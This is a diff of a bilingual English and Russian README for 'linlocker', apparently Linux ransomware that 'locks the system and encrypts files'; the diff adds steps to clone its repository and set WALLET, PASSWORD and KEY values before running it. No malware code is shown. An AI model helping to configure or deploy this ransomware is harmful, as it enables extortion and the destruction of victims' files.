@@ -21,7 +21,7 @@ linlocker — Locks the system and encrypts files
 # Clone repository
 git clone https://github.com/cpythonkiller/linlocker.git
 
-# Change
+# Change to linlocker.py
 WALLET = 'YOUR WALLET'
 PASSWORD = 'YOUR PASSWORD'
 KEY = 'YOUR KEY'
@@ -56,6 +56,11 @@ linlocker — Блокирует систему и шифрует файлы
 ```bash
 # Клонируй репозиторий
 git clone https://github.com/cpythonkiller/linlocker.git
+
+# Изменить на linlocker.py
+WALLET = 'ВАШ КОШЕЛЕК'
+PASSWORD = 'ВАШ ПАРОЛЬ'
+KEY = 'ВАШ КЛЮЧ'
 
 # Запуск
 python linlocker.py
